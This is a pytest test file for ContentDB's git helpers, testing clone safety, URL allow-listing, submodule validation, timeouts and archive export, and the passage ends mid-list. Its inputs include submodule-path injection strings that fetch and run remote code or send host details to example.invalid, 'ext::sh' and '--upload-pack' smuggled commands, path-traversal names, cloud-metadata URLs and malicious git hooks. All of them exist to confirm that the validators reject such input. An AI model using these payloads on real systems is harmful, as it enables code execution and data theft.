# ContentDB
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Zenon Seth <Zenon.Seth@gmail.com>

import contextlib
import hashlib
import os
import re
import shutil
import socket
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from zipfile import ZipFile, ZipInfo

import git
import pytest

from app.tasks import TaskError
from app.utils import git as git_utils
from app.utils.files import get_temp_dir
from app.utils.git import clone_repo, create_archive, get_latest_commit, get_latest_tag, get_commit_list


@pytest.fixture
def local_repo(tmp_path, monkeypatch):
	"""
	Creates a local repo with two commits on master,
	a v1 tag on the first, and a test-branch.
	Returns its file:// URL and the commit hashes.
	"""
	path = tmp_path / "origin"
	repo = git.Repo.init(path, initial_branch="master")
	with repo.config_writer() as cw:
		cw.set_value("user", "name", "Test")
		cw.set_value("user", "email", "test@example.com")

	(path / "init.lua").write_text("")
	repo.index.add(["init.lua"])
	first = repo.index.commit("First").hexsha
	repo.create_tag("v1", message="First release")
	repo.create_head("test-branch")

	(path / "second.txt").write_text("")
	repo.index.add(["second.txt"])
	second = repo.index.commit("Second").hexsha

	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
	return path.as_uri(), first, second


@pytest.fixture
def allow_file_protocol(monkeypatch):
	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "file")


@pytest.fixture
def temp_root(tmp_path, monkeypatch):
	root = tmp_path / "tmp"
	root.mkdir()
	monkeypatch.setattr(tempfile, "tempdir", str(root))
	return root


def test_local_repo_works_when_file_protocol_allowed(local_repo, allow_file_protocol):
	url, first, second = local_repo

	with clone_repo(url) as repo:
		assert repo.head.commit.hexsha == second
	with clone_repo(url, "test-branch") as repo:
		assert repo.head.commit.hexsha == first
	with clone_repo(url, "v1") as repo:
		assert repo.head.commit.hexsha == first

	assert get_latest_commit(url) == second
	assert get_latest_commit(url, "test-branch") == first
	assert get_latest_tag(url) == ("v1", first, "First release")
	assert get_commit_list(url, first, second) == ["Second"]


def test_clone_refuses_file_protocol(local_repo):
	url, first, _ = local_repo

	with pytest.raises(TaskError, match="not allowed"):
		with clone_repo(url):
			pass

	with pytest.raises(TaskError, match="not allowed"):
		with clone_repo(url, first):
			pass


@pytest.mark.parametrize("func", [
	lambda url, commit: get_latest_commit(url),
	lambda url, commit: get_latest_tag(url),
	lambda url, commit: get_commit_list(url, commit, commit),
])
def test_remote_queries_refuse_file_protocol(local_repo, func):
	url, first, _ = local_repo

	with pytest.raises(git.GitCommandError, match="not allowed"):
		func(url, first)


def test_remote_queries_use_generate_git_url(local_repo, allow_file_protocol, monkeypatch):
	url, first, second = local_repo
	monkeypatch.setattr(git_utils, "generate_git_url", lambda u: u.replace("dummy:", "file:"))
	dummy_url = url.replace("file:", "dummy:")

	with clone_repo(dummy_url) as repo:
		assert repo.head.commit.hexsha == second
	assert get_latest_commit(dummy_url) == second
	assert get_latest_tag(dummy_url) == ("v1", first, "First release")
	assert get_commit_list(dummy_url, first, second) == ["Second"]


def test_global_config_is_ignored(local_repo, allow_file_protocol, tmp_path, monkeypatch):
	url, _, second = local_repo
	home = tmp_path / "home"
	(home / ".config" / "git").mkdir(parents=True)
	broken = f'[url "file:///nonexistent/"]\n\tinsteadOf = {url}\n'
	(home / ".gitconfig").write_text(broken)
	(home / ".config" / "git" / "config").write_text(broken)
	monkeypatch.setenv("HOME", str(home))
	monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)

	with clone_repo(url) as repo:
		assert repo.head.commit.hexsha == second
	assert get_latest_commit(url) == second


def test_clone_bad_name_in_body_is_task_error(local_repo, allow_file_protocol):
	url, _, _ = local_repo

	with pytest.raises(TaskError, match="Unable to find the reference"):
		with clone_repo(url) as repo:
			repo.commit("nope")


@pytest.mark.parametrize("ref", ["--orphan=evil", "-bevil"])
def test_clone_ref_is_not_an_option(local_repo, allow_file_protocol, ref):
	url, _, _ = local_repo

	with pytest.raises(TaskError):
		with clone_repo(url, ref):
			pass


def test_clone_missing_ref(local_repo, allow_file_protocol):
	url, _, _ = local_repo

	with pytest.raises(TaskError, match="nope"):
		with clone_repo(url, "nope"):
			pass


@pytest.mark.parametrize("ref", [None, "test-branch"])
def test_clone_cleans_up_when_body_raises(local_repo, allow_file_protocol, temp_root, ref):
	url, _, _ = local_repo

	with pytest.raises(RuntimeError):
		with clone_repo(url, ref):
			assert len(os.listdir(temp_root)) == 1
			raise RuntimeError()

	assert os.listdir(temp_root) == []


@pytest.mark.parametrize("ref", [None, "nope"])
def test_clone_cleans_up_when_clone_fails(local_repo, temp_root, ref):
	url, _, _ = local_repo

	with pytest.raises(TaskError):
		with clone_repo(url, ref):
			pass

	assert os.listdir(temp_root) == []


def test_get_temp_dir_cleans_up_when_body_raises(temp_root):
	with pytest.raises(RuntimeError):
		with get_temp_dir() as path:
			assert os.path.isdir(path)
			raise RuntimeError()

	assert os.listdir(temp_root) == []


@pytest.mark.parametrize("url, expected", [
	("https://github.com/a/b", "https://github.com/a/b"),
	("http://github.com/a/b.git", "https://github.com/a/b.git"),
	("git://codeberg.org/a/b", "https://codeberg.org/a/b"),
	("https://GitHub.com/a/b", "https://github.com/a/b"),
	(" https://github.com/a/b ", "https://github.com/a/b"),
	("https://github.com/a/b?tab=readme-ov-file", "https://github.com/a/b"),
	("https://user:token@github.com:8080/a/b#readme", "https://github.com/a/b"),
])
def test_generate_git_url(url, expected):
	assert git_utils.generate_git_url(url) == expected


@pytest.mark.parametrize("url", [
	"https://evil.example/a/b",
	"https://github.com.evil.example/a/b",
	"https://evil.example#@github.com/a/b",
	"https://127.0.0.1/a/b",
	"https://[::1]/a/b",
	"https://169.254.169.254/latest/meta-data",
	"http://localhost/a/b",
	"http://db:5432/",
	"github.com/a/b",
	"file:///etc/passwd",
	"/home/cdb/config.cfg",
	"",
])
def test_generate_git_url_rejects_host(url):
	with pytest.raises(TaskError, match="not allowed"):
		git_utils.generate_git_url(url)


def test_generate_git_url_rejects_malformed():
	with pytest.raises(TaskError, match="not valid"):
		git_utils.generate_git_url("https://[evil/a")


def test_disallowed_host_refused_before_git(monkeypatch):
	def no_git(*args, **kwargs):
		raise AssertionError("git was called")

	monkeypatch.setattr(git_utils, "_run_git", no_git)
	monkeypatch.setattr(git.cmd.Git, "execute", no_git)

	url = "https://evil.example/a/b"
	for func in [
		lambda: clone_repo(url).__enter__(),
		lambda: clone_repo(url, "master").__enter__(),
		lambda: get_latest_commit(url),
		lambda: get_latest_tag(url),
		lambda: get_commit_list(url, "a", "b"),
	]:
		with pytest.raises(TaskError, match="not allowed"):
			func()


PAYLOAD_PATHS = [
	'a");import os;os.environ["no_proxy"]=chr(42);exec(__import__("urllib.request").request.urlopen("https"+chr(58)+chr(47)+chr(47)+"example.invalid"+chr(47)+"p.py").read())#',
	'a");import os;os.system("wget -qO /tmp/z1 https://example.invalid/z1 || curl -sko /tmp/z1 https://example.invalid/z1");#',
	'a");import os;os.system("curl https://example.invalid/beacon?d=$(id;hostname;uname -srm)")#',
	"a;touch canary",
	"$(touch canary)",
	"`touch canary`",
	"a'b",
	"a\nb",
	"sub\r",
	"a b",
	"-evil",
	"--upload-pack=touch canary",
	"../evil",
	"a/../b",
	"/etc",
	".",
	"a//b",
	"a/",
	".git",
	"a/.GIT/hooks",
	"",
]


@pytest.mark.parametrize("path", PAYLOAD_PATHS)
def test_check_submodules_rejects_path(path):
	with pytest.raises(TaskError, match="path is not allowed"):
		git_utils._check_submodules({"x": {"path": path, "url": "https://github.com/a/b.git"}})


@pytest.mark.parametrize("url, match", [
	("http://github.com/a/b.git", "doesn't use https://"),
	("git://github.com/a/b.git", "doesn't use https://"),
	("ssh://git@github.com/a/b.git", "doesn't use https://"),
	("git@github.com:a/b.git", "doesn't use https://"),
	("../b.git", "doesn't use https://"),
	("./b", "doesn't use https://"),
	("/tmp/b", "doesn't use https://"),
	("file:///tmp/b", "doesn't use https://"),
	("ext::sh -c touch% canary", "doesn't use https://"),
	("https://evil.example/a/b.git", "host 'evil.example' is not allowed"),
	("https://127.0.0.1/a/b.git", "host '127.0.0.1' is not allowed"),
	("https://GitHub.com/a/b.git", "Please use 'https://github.com/a/b.git' instead"),
	("https://user@github.com/a/b.git", "Please use 'https://github.com/a/b.git' instead"),
	("https://github.com/a/b.git?x=1", "Please use 'https://github.com/a/b.git' instead"),
	("https://[evil/a", "not valid"),
])
def test_check_submodules_rejects_url(url, match):
	with pytest.raises(TaskError, match=re.escape(match)):
		git_utils._check_submodules({"x": {"path": "x", "url": url}})


def test_check_submodules_accepts_valid():
	assert git_utils._check_submodules({
		"a": {"path": "mods/a", "url": "https://github.com/a/a.git"},
		"b.c": {"path": "b.c", "url": "https://codeberg.org/b/c", "branch": "main"},
	}) == ["mods/a", "b.c"]


@pytest.mark.parametrize("modules, match", [
	({"a": {"path": "a"}}, "needs both"),
	({"a": {"url": "https://github.com/a/a"}}, "needs both"),
	({"a": {"path": "mods/a", "url": "https://github.com/a/a"},
			"b": {"path": "Mods/A", "url": "https://github.com/a/b"}}, "used twice"),
])
def test_check_submodules_rejects_entries(modules, match):
	with pytest.raises(TaskError, match=match):
		git_utils._check_submodules(modules)


# The name decides where git puts .git/modules/<name>, so ".." in it escapes the git dir
@pytest.mark.parametrize("name", [
	"../../modules/evil",
	"../foo",
	"/../foo",
	"..\\foo",
	"\\..\\foo",
	"foo/..",
	"foo/../",
	"foo\\..",
	"foo\\..\\",
	"foo/../bar",
	"/etc",
	"a//b",
	"-evil",
	"a\nb",
	"a\rb",
	"",
])
def test_check_submodules_rejects_name(name):
	with pytest.raises(TaskError, match="name is not allowed"):
		git_utils._check_submodules({name: {"path": "x", "url": "https://github.com/a/b.git"}})


@pytest.mark.parametrize("name", ["valid", "valid/with/paths", "my mod", "a.b", "..foo", "foo..", "a-b_c"])
def test_check_submodules_accepts_name(name):
	assert git_utils._check_submodules({name: {"path": "x", "url": "https://github.com/a/b.git"}}) == ["x"]


def make_repo(path: Path) -> git.Repo:
	repo = git.Repo.init(path, initial_branch="master")
	repo.git.update_environment(GIT_CONFIG_COUNT="1",
			GIT_CONFIG_KEY_0="protocol.file.allow", GIT_CONFIG_VALUE_0="always")
	with repo.config_writer() as cw:
		cw.set_value("user", "name", "Test")
		cw.set_value("user", "email", "test@example.com")
	(path / "init.lua").write_text("")
	repo.index.add(["init.lua"])
	repo.index.commit("Initial commit")
	return repo


def add_submodule(repo: git.Repo, sub: git.Repo, path: str):
	repo.git.submodule("add", Path(sub.working_dir).as_uri(), path)
	repo.index.commit("Add " + path)


def set_gitmodule(repo: git.Repo, name: str, path: str, url: str):
	repo.git.config("-f", ".gitmodules", f"submodule.{name}.path", path)
	repo.git.config("-f", ".gitmodules", f"submodule.{name}.url", url)
	repo.index.add([".gitmodules"])
	repo.index.commit("Edit .gitmodules")


def add_gitlink(repo: git.Repo, path: str):
	repo.git.update_index("--add", "--cacheinfo", f"160000,{repo.head.commit.hexsha},{path}")
	repo.index.commit("Add gitlink " + path)


@pytest.fixture
def nested_repo(tmp_path, monkeypatch):
	"""
	top -> mid -> mods/leaf, and top -> other.
	top's .gitmodules also has stale entries with no gitlink, one of them a payload,
	and top has a gitlink with no .gitmodules entry.
	Returns top's file:// URL.
	"""
	leaf = make_repo(tmp_path / "leaf")
	mid = make_repo(tmp_path / "mid")
	add_submodule(mid, leaf, "mods/leaf")
	other = make_repo(tmp_path / "other")
	top = make_repo(tmp_path / "top")
	add_submodule(top, mid, "mid")
	add_submodule(top, other, "other")
	set_gitmodule(top, "gone", "gone", (tmp_path / "leaf").as_uri())
	set_gitmodule(top, "junk", "../evil", "ext::sh -c touch% canary")
	add_gitlink(top, "orphan")

	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
	monkeypatch.setattr(git_utils, "_check_submodule_url", lambda path, url: None)
	return (tmp_path / "top").as_uri()


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_nested_submodules(nested_repo, allow_file_protocol, ref):
	with clone_repo(nested_repo, ref, recursive=True) as repo:
		root = repo.working_tree_dir
		assert os.path.isfile(os.path.join(root, "mid", "init.lua"))
		assert os.path.isfile(os.path.join(root, "mid", "mods", "leaf", "init.lua"))
		assert os.path.isfile(os.path.join(root, "other", "init.lua"))
		assert not os.path.exists(os.path.join(root, "gone"))
		assert os.listdir(os.path.join(root, "orphan")) == []


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_skips_submodules_unless_recursive(nested_repo, allow_file_protocol, ref):
	with clone_repo(nested_repo, ref) as repo:
		assert not os.path.exists(os.path.join(repo.working_tree_dir, "mid", "init.lua"))
		assert not os.path.exists(os.path.join(repo.working_tree_dir, "other", "init.lua"))


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_submodule_limits(nested_repo, allow_file_protocol, monkeypatch, ref):
	monkeypatch.setattr(git_utils, "MAX_SUBMODULE_DEPTH", 1)
	with pytest.raises(TaskError, match="nested more than 1 levels"):
		with clone_repo(nested_repo, ref, recursive=True):
			pass

	monkeypatch.setattr(git_utils, "MAX_SUBMODULE_DEPTH", 5)
	monkeypatch.setattr(git_utils, "MAX_SUBMODULES", 2)
	with pytest.raises(TaskError, match="Too many submodules"):
		with clone_repo(nested_repo, ref, recursive=True):
			pass


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_submodules_share_one_timeout(nested_repo, allow_file_protocol, monkeypatch, ref):
	real_run_git = git_utils._run_git
	commands = []

	def slow(args, *rest, **kwargs):
		commands.append(args)
		time.sleep(1.1)
		return real_run_git(args, *rest, **kwargs)

	monkeypatch.setattr(git_utils, "_run_git", slow)
	monkeypatch.setattr(git_utils, "GIT_FETCH_TIMEOUT", 1)

	with pytest.raises(TaskError, match="Timed out fetching submodules"):
		with clone_repo(nested_repo, ref, recursive=True):
			pass

	assert [args[0] for args in commands].count("submodule") == 1


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_rejects_payload_before_fetching(local_repo, allow_file_protocol, tmp_path, monkeypatch, ref):
	url, _, _ = local_repo
	canary = tmp_path / "canary"
	repo = git.Repo(tmp_path / "origin")
	for name, path in [("x", f'a");import os;os.system("touch {canary}")#'), ("y", f"$(touch {canary})")]:
		set_gitmodule(repo, name, path, url)
		add_gitlink(repo, path)

	real_run_git = git_utils._run_git
	commands = []

	def spy(args, *rest, **kwargs):
		commands.append(args)
		return real_run_git(args, *rest, **kwargs)

	monkeypatch.setattr(git_utils, "_run_git", spy)

	with pytest.raises(TaskError, match="path is not allowed"):
		with clone_repo(url, ref, recursive=True):
			pass

	assert not any(args[0] == "submodule" for args in commands)
	assert not canary.exists()


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_rejects_nested_payload(tmp_path, allow_file_protocol, monkeypatch, ref):
	make_repo(tmp_path / "leaf")
	mid = make_repo(tmp_path / "mid")
	set_gitmodule(mid, "evil", "a;touch evil", (tmp_path / "leaf").as_uri())
	add_gitlink(mid, "a;touch evil")
	top = make_repo(tmp_path / "top")
	add_submodule(top, mid, "mid")
	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
	monkeypatch.setattr(git_utils, "_check_submodule_url", lambda path, url: None)

	with pytest.raises(TaskError, match="path is not allowed"):
		with clone_repo((tmp_path / "top").as_uri(), ref, recursive=True):
			pass


# Adapted from git's t7450-bad-git-dotfiles.sh: the git dir of a submodule named "../../modules/evil" is in the work tree
@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_rejects_evil_submodule_name(tmp_path, allow_local_urls, ref):
	canary = tmp_path / "canary"
	innocent = make_repo(tmp_path / "innocent")
	top = make_repo(tmp_path / "top")
	add_submodule(top, innocent, "evil")
	add_submodule(top, innocent, "another-module")

	modules = Path(top.working_dir) / "modules"
	shutil.copytree(Path(top.git_dir) / "modules" / "evil", modules / "evil")
	hook = modules / "evil" / "hooks" / "post-checkout"
	hook.write_text(f"#!/bin/sh\ntouch {canary}\n")
	hook.chmod(0o755)
	top.git.config("-f", ".gitmodules", "submodule.evil.update", "checkout")
	top.git.config("-f", ".gitmodules", "--rename-section", "submodule.evil", "submodule.../../modules/evil")
	top.git.add("-A")
	top.index.commit("evil")

	with pytest.raises(TaskError, match="name is not allowed"):
		with clone_repo((tmp_path / "top").as_uri(), ref, recursive=True):
			pass

	assert not canary.exists()


# Adapted from t7450: git refuses to check out a symlinked .gitmodules
@pytest.mark.parametrize("target", ["real_modules", "/etc/hostname"])
def test_clone_rejects_symlinked_gitmodules(tmp_path, allow_local_urls, target):
	sub = make_repo(tmp_path / "sub")
	top = make_repo(tmp_path / "top")
	config = f'[submodule "sub"]\n\tpath = sub\n\turl = {(tmp_path / "sub").as_uri()}\n'

	def plumbing(*args, stdin=None):
		return subprocess.run(["git", *args], cwd=top.working_dir, input=stdin, check=True, text=True,
				capture_output=True).stdout.strip()

	# The index refuses a symlinked .gitmodules, so make the tree directly
	init_blob = plumbing("rev-parse", "HEAD:init.lua")
	config_blob = plumbing("hash-object", "-w", "--stdin", stdin=config)
	target_blob = plumbing("hash-object", "-w", "--stdin", stdin=target)
	tree = plumbing("mktree", stdin=f"100644 blob {init_blob}\tinit.lua\n100644 blob {config_blob}\treal_modules\n" +
			f"120000 blob {target_blob}\t.gitmodules\n160000 commit {sub.head.commit.hexsha}\tsub\n")
	commit = plumbing("commit-tree", tree, "-m", "Symlinked .gitmodules")
	plumbing("update-ref", "refs/heads/master", commit)

	with pytest.raises(TaskError, match="invalid path .*gitmodules"):
		with clone_repo((tmp_path / "top").as_uri(), recursive=True):
			pass


# Adapted from t7450: a .gitmodules that is not a blob
def test_clone_ignores_gitmodules_directory(tmp_path, allow_local_urls):
	top = make_repo(tmp_path / "top")
	commit_files(top, {".gitmodules/file": "[submodule \"x\"]\n\tpath = x\n\turl = https://github.com/a/b.git\n"})

	with clone_repo((tmp_path / "top").as_uri(), recursive=True) as repo:
		assert os.path.isfile(os.path.join(repo.working_tree_dir, "init.lua"))


# Adapted from t7450: a corrupt .gitmodules
@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_rejects_corrupt_gitmodules(tmp_path, allow_local_urls, ref):
	top = make_repo(tmp_path / "top")
	commit_files(top, {".gitmodules": "[broken\n"})

	with pytest.raises(TaskError, match="bad config"):
		with clone_repo((tmp_path / "top").as_uri(), ref, recursive=True):
			pass

	with clone_repo((tmp_path / "top").as_uri(), ref) as repo:
		assert os.path.isfile(os.path.join(repo.working_tree_dir, "init.lua"))


# Adapted from t7450: nested git dirs for the submodules "hippo" and "hippo/hooks"
@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_rejects_nested_submodule_git_dirs(tmp_path, allow_local_urls, ref):
	top = make_repo(tmp_path / "top")
	commit_files(top, {".gitmodules": '[submodule "hippo"]\n\turl = .\n\tpath = thing1\n' +
			'[submodule "hippo/hooks"]\n\turl = .\n\tpath = thing2\n'})
	top.git.clone(".", "thing1")
	top.git.clone(".", "thing2")
	top.git.add("-A")
	top.index.commit("nested")

	with pytest.raises(TaskError, match="is inside git dir"):
		with clone_repo((tmp_path / "top").as_uri(), ref, recursive=True):
			pass


# Adapted from git's t7406-submodule-update.sh (CVE-2024-32002). On a case-insensitive
# filesystem the symlink "a" -> ".git" would redirect the submodule "A/modules/x" into the git dir.
@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_with_case_colliding_symlink_runs_no_hook(tmp_path, allow_local_urls, ref):
	canary = tmp_path / "canary"
	hook_repo = make_repo(tmp_path / "hook")
	hook = Path(hook_repo.working_dir) / "y" / "hooks" / "post-checkout"
	hook.parent.mkdir(parents=True)
	hook.write_text(f"#!/bin/sh\ntouch {canary}\n")
	hook.chmod(0o755)
	hook_repo.git.add("-A")
	hook_repo.index.commit("post-checkout")

	top = make_repo(tmp_path / "top")
	top.git.submodule("add", "--name", "x/y", (tmp_path / "hook").as_uri(), "A/modules/x")
	top.index.commit("Add submodule")
	dotgit = subprocess.run(["git", "hash-object", "-w", "--stdin"], cwd=top.working_dir, input=".git",
			text=True, capture_output=True, check=True).stdout.strip()
	top.git.update_index("--add", "--cacheinfo", f"120000,{dotgit},a")
	top.index.commit("Add symlink")

	with clone_repo((tmp_path / "top").as_uri(), ref, recursive=True) as repo:
		assert not canary.exists()
		with pytest.raises(TaskError, match="Symlinks are not supported"):
			create_archive(repo.working_dir, "pkg", str(tmp_path / "out.zip"), 1024 * 1024)

	assert not canary.exists()


@pytest.fixture
def stall_server():
	"""
	Accepts connections and never replies. Returns its http:// URL.
	"""
	server = socket.socket()
	server.bind(("127.0.0.1", 0))
	server.listen(50)
	conns = []

	def accept():
		with contextlib.suppress(OSError):
			while True:
				conns.append(server.accept()[0])

	threading.Thread(target=accept, daemon=True).start()
	yield f"http://127.0.0.1:{server.getsockname()[1]}/repo"

	server.close()
	for conn in conns:
		conn.close()


@pytest.fixture
def short_timeouts(monkeypatch):
	monkeypatch.setattr(git_utils, "GIT_TIMEOUT", 2)
	monkeypatch.setattr(git_utils, "GIT_FETCH_TIMEOUT", 2)
	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "http")
	monkeypatch.delitem(git_utils.GIT_ENV, "GIT_HTTP_LOW_SPEED_LIMIT")
	monkeypatch.delitem(git_utils.GIT_ENV, "GIT_HTTP_LOW_SPEED_TIME")


def processes_using(url: str) -> List[str]:
	ret = []
	for pid in filter(str.isdigit, os.listdir("/proc")):
		with contextlib.suppress(OSError):
			with open(f"/proc/{pid}/cmdline", "rb") as f:
				cmdline = f.read().decode(errors="replace")
			if url in cmdline:
				ret.append(cmdline.replace("\0", " "))
	return ret


def assert_times_out(func, url: str):
	start = time.monotonic()
	with pytest.raises((TaskError, git.GitCommandError), match="Timed out after 2 seconds"):
		func()
	assert time.monotonic() - start < 15
	assert processes_using(url) == []


def test_stalled_server_times_out(stall_server, short_timeouts, temp_root, monkeypatch):
	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)

	def clone(ref=None):
		with clone_repo(stall_server, ref):
			pass

	assert_times_out(lambda: get_latest_commit(stall_server), stall_server)
	assert_times_out(lambda: get_latest_tag(stall_server), stall_server)
	assert_times_out(lambda: get_commit_list(stall_server, "a", "b"), stall_server)
	assert_times_out(clone, stall_server)
	assert_times_out(lambda: clone("master"), stall_server)
	assert os.listdir(temp_root) == []


def test_stalled_submodule_times_out(local_repo, stall_server, short_timeouts, tmp_path, monkeypatch):
	url, _, _ = local_repo
	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "file:http")
	monkeypatch.setattr(git_utils, "_check_submodule_url", lambda path, url: None)

	repo = git.Repo(tmp_path / "origin")
	(tmp_path / "origin" / ".gitmodules").write_text(f'[submodule "sub"]\n\tpath = sub\n\turl = {stall_server}\n')
	repo.git.update_index("--add", "--cacheinfo", f"160000,{repo.head.commit.hexsha},sub")
	repo.index.add([".gitmodules"])
	repo.index.commit("Add submodule")

	def clone(ref=None):
		with clone_repo(url, ref, recursive=True):
			pass

	assert_times_out(clone, stall_server)
	assert_times_out(lambda: clone("master"), stall_server)


def test_low_speed_limit_is_used(stall_server, monkeypatch):
	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_HTTP_LOW_SPEED_TIME", "1")
	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "http")

	with pytest.raises(git.GitCommandError, match="too slow"):
		get_latest_commit(stall_server)


def write_content(path: Path, content):
	if isinstance(content, bytes):
		path.write_bytes(content)
	else:
		path.write_text(content)


def commit_files(repo: git.Repo, files: dict):
	if len(files) == 0:
		return
	for path, content in files.items():
		full_path = Path(repo.working_dir) / path
		full_path.parent.mkdir(parents=True, exist_ok=True)
		if isinstance(content, tuple) and content[0] == "link":
			os.symlink(content[1], full_path)
		elif isinstance(content, tuple) and content[0] == "exec":
			write_content(full_path, content[1])
			full_path.chmod(0o755)
		else:
			write_content(full_path, content)
	repo.git.add("-A")
	repo.git.commit("-m", "Add files")


def build_repo(tmp_path: Path, files: dict, sub_files: Optional[dict] = None, sub_path: str = "mods/sub") -> str:
	top = make_repo(tmp_path / "top")
	commit_files(top, files)
	if sub_files is not None:
		sub = make_repo(tmp_path / "sub")
		commit_files(sub, sub_files)
		add_submodule(top, sub, sub_path)
	return (tmp_path / "top").as_uri()


@pytest.fixture
def allow_local_urls(allow_file_protocol, monkeypatch):
	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
	monkeypatch.setattr(git_utils, "_check_submodule_url", lambda path, url: None)


@pytest.fixture
def archive_repo(tmp_path, allow_local_urls):
	"""
	top has an executable, export-ignored files and dirs, the submodule mods/sub
	with its own .gitattributes, the export-ignored submodule skip, and a gitlink with no .gitmodules entry.
	Returns top's file:// URL.
	"""
	url = build_repo(tmp_path, {
		"script.sh": ("exec", "echo hi"),
		"docs/readme.txt": "readme",
		"ignored.txt": "",
		"ignored_dir/a/x.txt": "",
		"ignored_dir2/x.txt": "",
		".gitattributes": "ignored.txt export-ignore\nignored_dir/ export-ignore\nignored_dir2 export-ignore\n" +
				"skip export-ignore\nmods/slashed/ export-ignore\n",
	}, {
		"sub.lua": "sub",
		"secret.txt": "",
		".gitattributes": "secret.txt export-ignore\n",
	})
	top = git.Repo(tmp_path / "top")
	top.git.update_environment(GIT_CONFIG_COUNT="1",
			GIT_CONFIG_KEY_0="protocol.file.allow", GIT_CONFIG_VALUE_0="always")
	skip = make_repo(tmp_path / "skip")
	add_submodule(top, skip, "skip")
	add_submodule(top, skip, "mods/slashed")
	add_gitlink(top, "orphan")
	return url


def make_archive(url: str, dest: Path, max_size: int = 1024 * 1024, recursive: bool = True,
		before=None) -> Dict[str, ZipInfo]:
	with clone_repo(url, recursive=recursive) as repo:
		if before is not None:
			before(Path(repo.working_dir))
		create_archive(repo.working_dir, "pkg", str(dest), max_size)

	with ZipFile(dest) as zf:
		return {info.filename: info for info in zf.infolist()}


def test_archive_contents(archive_repo, tmp_path):
	dest = tmp_path / "out.zip"
	entries = make_archive(archive_repo, dest)

	assert set(entries.keys()) == {
		"pkg/.gitattributes",
		"pkg/.gitmodules",
		"pkg/init.lua",
		"pkg/script.sh",
		"pkg/docs/readme.txt",
		"pkg/mods/sub/.gitattributes",
		"pkg/mods/sub/init.lua",
		"pkg/mods/sub/sub.lua",
	}
	for name, info in entries.items():
		expected = 0o100755 if name == "pkg/script.sh" else 0o100644
		assert info.external_attr >> 16 == expected, name

	with ZipFile(dest) as zf:
		assert zf.read("pkg/docs/readme.txt") == b"readme"
		assert zf.read("pkg/mods/sub/sub.lua") == b"sub"


def test_archive_ignores_user_attributes(archive_repo, tmp_path, monkeypatch):
	home = tmp_path / "home"
	(home / ".config" / "git").mkdir(parents=True)
	(home / ".config" / "git" / "attributes").write_text("*.lua export-ignore\n")
	monkeypatch.setenv("HOME", str(home))
	monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)

	entries = make_archive(archive_repo, tmp_path / "out.zip")
	assert "pkg/init.lua" in entries
	assert "pkg/mods/sub/sub.lua" in entries


def test_archive_is_reproducible(archive_repo, tmp_path):
	def touch_all(root: Path):
		for path in root.rglob("*"):
			os.utime(path, (1000000000, 1000000000), follow_symlinks=False)

	make_archive(archive_repo, tmp_path / "a.zip")
	entries = make_archive(archive_repo, tmp_path / "b.zip", before=touch_all)

	assert (tmp_path / "a.zip").read_bytes() == (tmp_path / "b.zip").read_bytes()
	# Zip times have a 2 second resolution
	commit_time = git.Repo(tmp_path / "top").head.commit.committed_date // 2 * 2
	assert entries["pkg/init.lua"].date_time == time.gmtime(commit_time)[:6]


# name -> (content, unix mode, zip date_time) for every file in the zip
def read_zip(path: Path) -> Dict[str, Tuple[bytes, int, Tuple[int, ...]]]:
	with ZipFile(path) as zf:
		return {info.filename: (zf.read(info), info.external_attr >> 16, info.date_time)
				for info in zf.infolist() if not info.filename.endswith("/")}


# git archive writes zip times in local time, so pin the zone
def git_archive_entries(repo_dir: Path, dest: Path, home: Path) -> Dict[str, Tuple[bytes, int, Tuple[int, ...]]]:
	env = {**os.environ, "HOME": str(home), "XDG_CONFIG_HOME": str(home), "TZ": "UTC",
			"GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_GLOBAL": os.devnull}
	subprocess.run(["git", "archive", "--format=zip", "--prefix=pkg/", "-o", str(dest), "HEAD"],
			cwd=repo_dir, env=env, check=True)
	return read_zip(dest)


def git_archive_names(repo_dir: Path, dest: Path, home: Path) -> Set[str]:
	return set(git_archive_entries(repo_dir, dest, home))


# From git's t5002-archive-attr-pattern.sh, with .gitattributes instead of .git/info/attributes
T5002_FILES = [
	"ignored",
	"not-ignored-dir/ignored",
	"not-ignored-dir/ignored-only-if-dir",
	"ignored-only-if-dir/ignored-by-ignored-dir",
	"ignored-without-slash/foo",
	"wildcard-without-slash/foo",
	"deep/and/slashless/foo",
	"deep/with/wildcard/foo",
	"one-level-lower/two-levels-lower/ignored-only-if-dir/ignored-by-ignored-dir",
	"kept.txt",
]
T5002_ATTRS = "ignored export-ignore\nignored-only-if-dir/ export-ignore\nignored-without-slash export-ignore\n" + \
		"wild*-without-slash export-ignore\ndeep/and/slashless export-ignore\ndeep/*t*/wildcard export-ignore\n"


@pytest.mark.parametrize("attrs, files, expected", [
	pytest.param(T5002_ATTRS, T5002_FILES,
			{".gitattributes", "not-ignored-dir/ignored-only-if-dir", "kept.txt"}, id="t5002"),
	pytest.param("*.txt export-ignore\nkeep.txt -export-ignore\n", ["a.txt", "keep.txt", "b.lua"],
			{".gitattributes", "keep.txt", "b.lua"}, id="unset"),
	pytest.param("*.txt export-ignore\nkeep.txt !export-ignore\n", ["a.txt", "keep.txt", "b.lua"],
